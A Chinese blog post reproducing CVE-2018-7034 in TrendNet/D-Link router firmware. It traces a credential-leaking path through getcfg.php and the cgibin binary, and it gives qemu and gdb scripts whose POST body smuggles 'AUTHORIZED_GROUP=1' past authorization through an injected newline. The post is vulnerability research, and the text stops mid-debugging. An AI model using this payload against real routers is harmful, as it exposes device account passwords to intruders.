<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>D-Link 登录信息泄露（权限绕过）漏洞分析报告（CVE-2018-7034） | XiDP</title><meta name="author" content="XiDP"><meta name="copyright" content="XiDP"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言漏洞编号CVE-2018-7034，影响D-Link和TrendNet的一些老设备。 通过网盘分享的文件：TEW751DR_FW103B03.bin链接: https://pan.baidu.com/s/1g37sSUnZQDQjpg_ABuGULg?pwd=xidp 提取码:..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "D-Link 登录信息泄露（权限绕过）漏洞分析报告（CVE-2018-7034）",
  "url": "http://example.com/2025/06/13/D-Link%20%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/",
  "image": "http://example.com/img/Qhead.png",
  "datePublished": "2025-06-12T16:00:00.000Z",
  "dateModified": "2025-06-14T11:23:43.945Z",
  "author": [
    {
      "@type": "Person",
      "name": "XiDP",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/Qhead.png"><link rel="canonical" href="http://example.com/2025/06/13/D-Link%20%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":5,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'D-Link 登录信息泄露（权限绕过）漏洞分析报告（CVE-2018-7034）',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/loading.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/Qhead.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/yu2.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">XiDP</span></a><a class="nav-page-title" href="/"><span class="site-name">D-Link 登录信息泄露（权限绕过）漏洞分析报告（CVE-2018-7034）</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">D-Link 登录信息泄露（权限绕过）漏洞分析报告（CVE-2018-7034）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-12T16:00:00.000Z" title="发表于 2025-06-13 00:00:00">2025-06-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-14T11:23:43.945Z" title="更新于 2025-06-14 19:23:43">2025-06-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/IOT/">IOT</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CVE%E5%A4%8D%E7%8E%B0/">CVE复现</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:100,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2025-06-14 19:23:43&quot;}" hidden></div><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>漏洞编号<code>CVE-2018-7034</code>，影响<code>D-Link</code>和<code>TrendNet</code>的一些老设备。</p>
<p>通过网盘分享的文件：TEW751DR_FW103B03.bin<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1g37sSUnZQDQjpg_ABuGULg?pwd=xidp">https://pan.baidu.com/s/1g37sSUnZQDQjpg_ABuGULg?pwd=xidp</a> 提取码: xidp</p>
<p>这里分析的是<code>TrendNet TEW751</code>的固件，此外<code>D-Link</code>的一些老设备，如<code>DIR645</code>，<code>DIR815</code>等也都受该漏洞影响。</p>
<h3 id="基础工具配置"><a href="#基础工具配置" class="headerlink" title="基础工具配置"></a><strong>基础工具配置</strong></h3><p>复现环境 <code>Ubuntu 24.04.2 LTS</code><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/1.png"></p>
<p>基础工具配置可以参考这篇文章中的配置: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18079">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现-先知社区</a></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h3><p>存在漏洞的地方为 <code>/squashfs-root/htdocs/web/getcfg.php</code></p>
<p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/2.png"></p>
<p>这里通过 <code>$AUTHORIZED_GROUP</code> 变量判断用户权限<br>而 <code>$GETCFG_SVC = cut($_POST[&quot;SERVICES&quot;], $SERVICE_INDEX, &quot;,&quot;);</code> 中，<code>$GETCFG_SVC</code> 是通过 <code>POST</code> 传入的 <code>$_POST[&quot;SERVICES&quot;]</code> 所以这里文件的加载是我们可控的，也就是我们可以控制 <code>/htdocs/webinc/getcfg/</code> 这个路径下的文件加载，这显然存在一个我们可以利用的地方，所以我们需要进入到 <code>else分支</code> 中，也就是说我们的 <code>$AUTHORIZED_GROUP</code> 变量应该 <code>大于等于0</code></p>
<p>我们进入这个路径 <code>/htdocs/webinc/getcfg/</code> 看看有什么文件是我们可以利用的<br>通过观察我们发现 <code>/htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php</code> 这个文件</p>
<p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/3.png"></p>
<p>这段代码的作用是遍历系统路径<code>/device/account/entry</code>下的所有账户条目，并且使用echo输出，并且echo输出的条目包括<code>用户名和密码</code>，所以我们可通过这个加载文件泄露账号</p>
<p>但是，我们首先还是得先知道如何绕过全局变量 <code>$AUTHORIZED_GROUP &gt;= 0</code> 的检查<br>我们在 <code>squashfs-root</code> 文件夹中使用命令 <code>grep -ra &#39;AUTHORIZED_GROUP&#39;</code> 来寻找都有哪些文件含有控制 <code>$AUTHORIZED_GROUP</code> 变量的功能</p>
<p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/4.png"><br>得到的结果如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">htdocs/webinc/templates.php:	<span class="keyword">if</span> (isfile(<span class="string">&quot;/htdocs/webinc/js/&quot;</span>.$TEMP_MYNAME.<span class="string">&quot;.php&quot;</span>)==<span class="number">1</span>  &amp;&amp; $AUTHORIZED_GROUP &gt;= <span class="number">0</span>)</span><br><span class="line">htdocs/webinc/templates.php:	var AUTH = new Authenticate(&lt;?=$AUTHORIZED_GROUP?&gt;, &lt;?echo query(<span class="string">&quot;/device/session/timeout&quot;</span>);?&gt;);</span><br><span class="line">htdocs/webinc/templates.php:	var PAGE = &lt;? <span class="keyword">if</span> (isfile(<span class="string">&quot;/htdocs/webinc/js/&quot;</span>.$TEMP_MYNAME.<span class="string">&quot;.php&quot;</span>)==<span class="number">1</span> &amp;&amp; $AUTHORIZED_GROUP&gt;=<span class="number">0</span>) echo <span class="string">&quot;new Page();&quot;</span>; <span class="keyword">else</span> echo <span class="string">&quot;null;&quot;</span>; ?&gt;</span><br><span class="line">htdocs/webinc/templates.php:	<span class="keyword">if</span> (isfile(<span class="string">&quot;/htdocs/webinc/body/&quot;</span>.$_GLOBALS[<span class="string">&quot;TEMP_MYNAME&quot;</span>].<span class="string">&quot;.php&quot;</span>)==<span class="number">1</span> &amp;&amp; $AUTHORIZED_GROUP&gt;=<span class="number">0</span>)</span><br><span class="line">htdocs/webinc/templates.php:	<span class="keyword">if</span> (isfile(<span class="string">&quot;/htdocs/webinc/body/&quot;</span>.$_GLOBALS[<span class="string">&quot;TEMP_MYNAME&quot;</span>].<span class="string">&quot;.php&quot;</span>)==<span class="number">1</span> &amp;&amp; $AUTHORIZED_GROUP&gt;=<span class="number">0</span>)</span><br><span class="line">htdocs/webinc/templates.php:	<span class="keyword">if</span> (isfile(<span class="string">&quot;/htdocs/webinc/body/&quot;</span>.$_GLOBALS[<span class="string">&quot;TEMP_MYNAME&quot;</span>].<span class="string">&quot;.php&quot;</span>)==<span class="number">1</span> &amp;&amp; $AUTHORIZED_GROUP&gt;=<span class="number">0</span>)</span><br><span class="line">htdocs/webinc/templates.php:	<span class="keyword">if</span> (isfile(<span class="string">&quot;/htdocs/webinc/body/&quot;</span>.$_GLOBALS[<span class="string">&quot;TEMP_MYNAME&quot;</span>].<span class="string">&quot;.php&quot;</span>)==<span class="number">1</span> &amp;&amp; $AUTHORIZED_GROUP&gt;=<span class="number">0</span>)</span><br><span class="line">htdocs/webinc/js/info.php:		<span class="comment">//TRACE_error(&quot;AUTHORIZED_GROUP=&quot;.$_GET[&quot;AUTHORIZED_GROUP&quot;]);</span></span><br><span class="line">htdocs/web/dlnastate.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/check_stats.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/wandetect.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/wpsstate.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/session_act.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/log_clear.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP==<span class="number">0</span>)</span><br><span class="line">htdocs/web/wifi_stat.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/routing_stat.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/firmversion.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/js/postxml.js:					self.AuthorizedGroup = xml.Get(<span class="string">&quot;/report/AUTHORIZED_GROUP&quot;</span>);</span><br><span class="line">htdocs/web/wiz_freset.php:<span class="keyword">if</span>(query(<span class="string">&quot;/runtime/device/devconfsize&quot;</span>)==<span class="string">&quot;0&quot;</span>) $AUTHORIZED_GROUP = <span class="number">0</span>;</span><br><span class="line">htdocs/web/DevInfo.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/getcfg.php:	<span class="keyword">if</span>($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/diagnostic.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/ddns_act.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/log_get.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP==<span class="number">0</span>)</span><br><span class="line">htdocs/web/sitesurvey.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/wpsacts.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/check.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/cgibin:	&lt;AUTHORIZED_GROUP&gt;%d&lt;/AUTHORIZED_GROUP&gt;</span><br><span class="line">htdocs/cgibin:application/audio/example/image/message/model/multipart/text/video/read_ct_videoread_ct_textread_ct_multipartread_ct_modelread_ct_messageread_ct_imageread_ct_exampleread_ct_audioread_ct_applicationSystem rebootUpgrade firmware successFail to write file!Image file is not acceptable. Please check download version is rightFail to get the file, please check the IP address and check the file name::ffff:Web login success from %sWeb login failure from %sWeb logout from %s_POST__FILES_N/A_FILETYPES__GET__SERVER_REQUEST_METHODHEADGETPOST/htdocs/web/info.php/info.phpFAILERR_REQ_TOO_LONGunsupported HTTP requestAUTHORIZED_GROUP=%dSESSION_UID=sobj_new() error!ERR_NO_FILEr+ERR_FOPEN_FAILsignature=_aLpHaERR_INVALID_SEAMAERR_SEAMA_META_TOO_LARGEERR_SEAMA_CHECKSUM_ERRERR_SEAMA_META_ERRnoheader=<span class="number">1</span>type=type=firmwaretype=devconfdev=/dev/mtdblock/<span class="number">2</span>/var/config.xml.gzdevconf put -f /var/config.xml.gz%lu/var/session/configsize/var/firmware.seama/var/session/imagesizeERR_INVALID_FILE/etc/config/image_signPELOTA_REPORT/dlcfg.cgiREPORT_METHODhttp:<span class="comment">//HTTP_HOSTSERVER_PORT80HTTP_REFERERDELAYERR_UNAUTHORIZED_SESSIONERR_READ_SIGN_FAILSUCCESS/var/run/fwseama.lockpreupdate:%d:event PREFWUPDATEERR_ANOTHER_FWUP_PROGRESS/etc/scripts/dlcfg_hlper.sh/htdocs/web/docs/config.binHTTContent-Disposition: attachment; filename=&quot;%s&quot;</span></span><br></pre></td></tr></table></figure>
<p>从这里可以看到有两个可以给 <code>$AUTHORIZED_GROUP</code> 赋值的地方，一个是在 <code>/htdocs/web/wiz_freset.php</code>，另一个是在 <code>/htdocs/cgibin</code> 本文我们利用的是 <code>cgibin</code></p>
<p>但是下面我们先来看看 <code>wiz_freset.php</code><br>通过这里的注释我们知道它是<code>用于出厂默认设置</code>时的，所以我们暂时不考虑<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/5.png"></p>
<p>因此，我们需要逆向分析<code>cgibin</code>文件，进入 <code>main函数</code> 中<br>由于这里的 <code>webserver</code> 运行的是<code>php</code>脚本，那么这个二进制文件中重点的就是处理 <code>php</code> 语言的部分，也就是<code>phpcgi</code>，我们进入 <code>phpcgi_main</code></p>
<p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/6.png"></p>
<p>进入 <code>phpcgi_main</code> 之后我们分析一下下面这几个函数<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/7.png"></p>
<p><code>sobj_new()</code> 的作用是创建一个结构体，用于存放之后程序解析出来的各个字段<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/8.png"></p>
<p><code>sobj_add_string(v7, *(a2 + 4));</code> 的作用就是将 <code>*(a2 + 4)</code> 存储的内容放入到 <code>v7</code> 这个结构体中</p>
<p>下面编写shell脚本来使用qemu进行动态调试<br>编写<code>start.sh</code>脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"><span class="meta"># sudo ./start.sh</span></span><br><span class="line"></span><br><span class="line">INPUT=$(python -c <span class="string">&quot;print(&#x27;SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1&#x27;)&quot;</span>)</span><br><span class="line">LEN=$(echo $INPUT | wc -c)</span><br><span class="line">PORT=<span class="string">&quot;1234&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$LEN&quot;</span> == <span class="string">&quot;0&quot;</span> ] || [ <span class="string">&quot;$INPUT&quot;</span> == <span class="string">&quot;-h&quot;</span> ] || [ <span class="string">&quot;$UID&quot;</span> != <span class="string">&quot;0&quot;</span> ]</span><br><span class="line">then</span><br><span class="line">    echo -e <span class="string">&quot;\nusage: sudo $0\n&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">cp $(which qemu-mipsel-<span class="type">static</span>) ./qemu</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;$INPUT&quot;</span> | chroot . ./qemu <span class="number">-0</span> <span class="string">&quot;/phpcgi&quot;</span> \</span><br><span class="line">    -E CONTENT_LENGTH=$LEN \</span><br><span class="line">    -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> \</span><br><span class="line">    -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> \</span><br><span class="line">    -E REQUEST_URI=<span class="string">&quot;/getcfg.php&quot;</span> \</span><br><span class="line">    -E REMOTE_ADDR=<span class="string">&quot;127.0.0.1&quot;</span> \</span><br><span class="line">    -g $PORT ./htdocs/cgibin <span class="string">&quot;/phpcgi&quot;</span> <span class="string">&quot;/phpcgi&quot;</span>  # <span class="number">2</span>&gt;/dev/null</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;run ok&quot;</span></span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure>

<p>编写gdb脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mygdb.sh</span></span><br><span class="line"></span><br><span class="line">set architecture mips                                     </span><br><span class="line">set follow-fork-mode child  </span><br><span class="line">set detach-on-fork off                                    </span><br><span class="line">file ./htdocs/cgibin</span><br><span class="line">target remote 127.0.0.1:1234        </span><br></pre></td></tr></table></figure>

<p>下面分别执行即可进入gdb界面进行调试</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ./start.sh</span><br><span class="line">gdb-multiarch -x mygdb.sh</span><br></pre></td></tr></table></figure>

<p>下面我们进入调试，在 <code>sobj_add_string</code> 函数处打上一个断点随后跟进到此处，这样我们就可以看到这里的几个参数，而它的第二个参数也就是 <code>*(a2 + 4)</code> 显示为 <code>phpcgi</code> 这个字符串，也就是说着在开头的 <code>sobj_add_string(v7, *(a2 + 4));</code> 它将 <code>phpcgi</code> 这个字符串写入了 <code>v7</code> 这个结构体中<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/9.png"></p>
<p>下面继续，可以看到下面 <code>27行-32行</code> 有一个 <code>for循环</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = a3; *i; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  sobj_add_string(v6, <span class="string">&quot;_SERVER_&quot;</span>);</span><br><span class="line">  sobj_add_string(v6, *i);</span><br><span class="line">  sobj_add_char(v6, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们进入 <code>for循环</code>，看看变量 <code>v6</code> 的变化(下面是进入for循环但是还没有开始执行for循环的任何指令)<br>根据图中信息 <code>v6</code> 的地址应该为 <code>0x438008</code> </p>
<p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/10.png"></p>
